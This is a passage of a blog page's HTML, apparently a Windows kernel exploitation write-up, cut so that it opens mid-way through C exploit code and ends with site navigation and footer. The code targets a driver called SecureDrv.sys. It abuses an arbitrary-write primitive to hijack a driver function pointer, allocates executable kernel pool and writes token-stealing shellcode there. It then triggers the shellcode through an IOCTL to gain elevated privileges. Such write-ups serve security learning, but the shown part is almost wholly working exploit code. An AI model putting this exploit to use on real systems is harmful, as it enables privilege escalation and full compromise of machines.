+	hDevice <span style="color:#f92672">=</span> CreateFile(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">SecureStorage</span><span style="color:#e6db74">&#34;</span>, GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE, <span style="color:#ae81ff">0</span>, NULL, OPEN_EXISTING, <span style="color:#ae81ff">0</span>, NULL);
+	<span style="color:#66d9ef">if</span> (hDevice <span style="color:#f92672">=</span><span style="color:#f92672">=</span> INVALID_HANDLE_VALUE) {
+		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Failed to open device</span><span style="color:#e6db74">&#34;</span>);
+		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+	}
+
+	ULONG64 ntoskrnl <span style="color:#f92672">=</span> getDrvBase(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ntoskrnl.exe</span><span style="color:#e6db74">&#34;</span>);
+	ULONG64 SecureDrv <span style="color:#f92672">=</span> getDrvBase(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SecureDrv.sys</span><span style="color:#e6db74">&#34;</span>);
+	ULONG64 func_ptr <span style="color:#f92672">=</span> SecureDrv <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4050</span>;
+
+	HMODULE hNtos <span style="color:#f92672">=</span> LoadLibrary(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ntoskrnl.exe</span><span style="color:#e6db74">&#34;</span>);
+	<span style="color:#66d9ef">if</span> (hNtos <span style="color:#f92672">=</span><span style="color:#f92672">=</span> NULL) {
+		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">LoadLibrary failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		exit(<span style="color:#ae81ff">0</span>);
+	}
+
+	ULONG64 ExAllocatePoolWithTag <span style="color:#f92672">=</span> (ULONG64)GetProcAddress(hNtos, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ExAllocatePoolWithTag</span><span style="color:#e6db74">&#34;</span>);
+	<span style="color:#66d9ef">if</span> (ExAllocatePoolWithTag <span style="color:#f92672">=</span><span style="color:#f92672">=</span> NULL) {
+		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">GetProcAddress Failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		exit(<span style="color:#ae81ff">0</span>);
+	}
+
+	ExAllocatePoolWithTag <span style="color:#f92672">=</span> ntoskrnl <span style="color:#f92672">+</span> (ExAllocatePoolWithTag <span style="color:#f92672">-</span> (ULONG64)hNtos);
+	printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ExAllocatePoolWithTag = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ExAllocatePoolWithTag);
+	<span style="color:#66d9ef">if</span> (strlen((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>ExAllocatePoolWithTag) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>) {
+		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ExAllocatePoolWithTag contains null</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+	}
+
+	<span style="color:#75715e">// Overwrite function pointer with address of ExAllocatePoolWithTag
+</span><span style="color:#75715e"></span>	arbWrite((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)func_ptr, (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>ExAllocatePoolWithTag), <span style="color:#ae81ff">0x8</span>);
+
+	<span style="color:#75715e">// Allocate executable region and retrive the address.
+</span><span style="color:#75715e"></span>	DWORD NonPagedPoolExecute <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	DWORD returned;
+	ULONG64 shellAddr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>;
+	<span style="color:#66d9ef">while</span> (<span style="color:#f92672">-</span><span style="color:#f92672">-</span>i) {
+		shellAddr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+		DeviceIoControl(hDevice,
+			IOCTL_ACT,
+			(LPVOID)NonPagedPoolExecute, <span style="color:#ae81ff">0x1000</span>,
+			<span style="color:#f92672">&amp;</span>shellAddr, <span style="color:#ae81ff">0</span>,
+			<span style="color:#f92672">&amp;</span>returned, nullptr
+		);
+		shellAddr<span style="color:#f92672">+</span><span style="color:#f92672">+</span>;
+		<span style="color:#66d9ef">if</span> (strlen((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>shellAddr) <span style="color:#f92672">&gt;</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>)
+			<span style="color:#66d9ef">break</span>;
+	}
+
+	printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Shellcode Addr = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, shellAddr);
+	<span style="color:#66d9ef">if</span> (i <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
+		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Failed to get null free pool addr</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+	}
+
+
+
+	shellAddr <span style="color:#f92672">=</span> shellAddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+	<span style="color:#75715e">// Write shellcode to kernel pool 
+</span><span style="color:#75715e"></span>	arbWrite((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)shellAddr, EoP, <span style="color:#ae81ff">0x100</span>);
+
+	<span style="color:#75715e">// Write shellcode addr to function pointer
+</span><span style="color:#75715e"></span>	arbWrite((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)func_ptr, (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>shellAddr), <span style="color:#ae81ff">0x8</span>);
+
+	<span style="color:#75715e">// Execute token stealing shellcode
+</span><span style="color:#75715e"></span>	DeviceIoControl(hDevice,
+		IOCTL_ACT,
+		NULL, NULL,
+		nullptr, <span style="color:#ae81ff">0</span>,
+		<span style="color:#f92672">&amp;</span>returned, nullptr
+	);
+
+
+	CloseHandle(hDevice);
+}
+</code></pre></div>
+
+
+                    </div>
+                </div>
+
+                
+                    <div class="col-sm-12 col-md-3">
+                        <nav id="TableOfContents" class="sticky-top">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#analysis">Analysis</a></li>
+        <li><a href="#vulnerability">Vulnerability</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                    </div>
+                
+            </div>
+
+            <div class="row">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    
+                        <div class="navigation">
+                            <div class="row">
+                                <div class="col-12 col-md-6">
+                                    
+                                        <div class="mx-0 mx-md-4 mt-4 text-left">
+                                            <a href="/blog/win7kernelpoolinternals/">
+                                                <span class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175">
+        <path d="M145.188,238.575l215.5-215.5c5.3-5.3,5.3-13.8,0-19.1s-13.8-5.3-19.1,0l-225.1,225.1c-5.3,5.3-5.3,13.8,0,19.1l225.1,225 c2.6,2.6,6.1,4,9.5,4s6.9-1.3,9.5-4c5.3-5.3,5.3-13.8,0-19.1L145.188,238.575z" />
+    </svg>
+</span>
+
+                                                <span class="text">Windows 7 Kernel Pool Internals</span>
+                                            </a>
+                                        </div>
+                                    
+                                </div>
+                                <div class="col-12 col-md-6">
+                                    
+                                </div>
+                            </div>
+                        </div>
+                    
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="my-4 footer">
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 mb-2 text-center text-md-left">
+                    
+
+                    
+                </div>
+            </div>
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 text-center text-md-right">
+                    
+
+                    
+
+                    
+    <a href="https://github.com/maheshhari"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="GitHub">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M8 0C3.58 0 0 3.582 0 8c0 3.535 2.292 6.533 5.47 7.59.4.075.547-.172.547-.385 0-.19-.007-.693-.01-1.36-2.226.483-2.695-1.073-2.695-1.073-.364-.924-.89-1.17-.89-1.17-.725-.496.056-.486.056-.486.803.056 1.225.824 1.225.824.714 1.223 1.873.87 2.33.665.072-.517.278-.87.507-1.07-1.777-.2-3.644-.888-3.644-3.953 0-.873.31-1.587.823-2.147-.09-.202-.36-1.015.07-2.117 0 0 .67-.215 2.2.82.64-.178 1.32-.266 2-.27.68.004 1.36.092 2 .27 1.52-1.035 2.19-.82 2.19-.82.43 1.102.16 1.915.08 2.117.51.56.82 1.274.82 2.147 0 3.073-1.87 3.75-3.65 3.947.28.24.54.73.54 1.48 0 1.07-.01 1.93-.01 2.19 0 .21.14.46.55.38C13.71 14.53 16 11.53 16 8c0-4.418-3.582-8-8-8"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+    <a href="https://twitter.com/slashb4sh"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Twitter">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M16 3.038c-.59.26-1.22.437-1.885.517.677-.407 1.198-1.05 1.443-1.816-.634.37-1.337.64-2.085.79-.598-.64-1.45-1.04-2.396-1.04-1.812 0-3.282 1.47-3.282 3.28 0 .26.03.51.085.75-2.728-.13-5.147-1.44-6.766-3.42C.83 2.58.67 3.14.67 3.75c0 1.14.58 2.143 1.46 2.732-.538-.017-1.045-.165-1.487-.41v.04c0 1.59 1.13 2.918 2.633 3.22-.276.074-.566.114-.865.114-.21 0-.41-.02-.61-.058.42 1.304 1.63 2.253 3.07 2.28-1.12.88-2.54 1.404-4.07 1.404-.26 0-.52-.015-.78-.045 1.46.93 3.18 1.474 5.04 1.474 6.04 0 9.34-5 9.34-9.33 0-.14 0-.28-.01-.42.64-.46 1.2-1.04 1.64-1.7z" fill-rule="nonzero"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+
+                    
+
+                    
+    <a href="mailto:maheshpdm2@gmail.com"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Email">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 16">
+            <path d="M0 4v8c0 .55.45 1 1 1h12c.55 0 1-.45 1-1V4c0-.55-.45-1-1-1H1c-.55 0-1 .45-1 1zm13 0L7 9 1 4h12zM1 5.5l4 3-4 3v-6zM2 12l3.5-3L7 10.5 8.5 9l3.5 3H2zm11-.5l-4-3 4-3v6z"/>
+        </svg>
+    </a>
+
+
+                    <a href=''
+    class="mx-1 ml-md-2 mr-md-0 icon"
+    aria-label="RSS">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+        <path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194 11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0 13.806c0-1.21.983-2.195 2.194-2.195zM10.606 16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"/>
+    </svg>
+</a>
+
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js" integrity="sha256-1zu+3BnLYV9LdiY85uXMzii3bdrkelyp37e0ZyTAQh0=" crossorigin="anonymous"></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/bash.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/css.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/diff.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/django.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/javascript.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/python.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/yaml.min.js" defer></script>
+        
+        <script>
+            window.addEventListener('load', function() {
+                hljs.initHighlighting();
+            }, true);
+        </script>
+    
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.js" integrity="sha256-LvFVlLdfGI3WeEH+8Ni4kxLm02g2GlOfeGCGLXfRk/U=" crossorigin="anonymous"></script>
+        <script>
+            window.addEventListener('load', function() {
+                progressively.init({delay: 30, throttle: 50});
+            }, true);
+        </script>
+    
+
+    
+
+    
+    
+</body>
+
+</html>
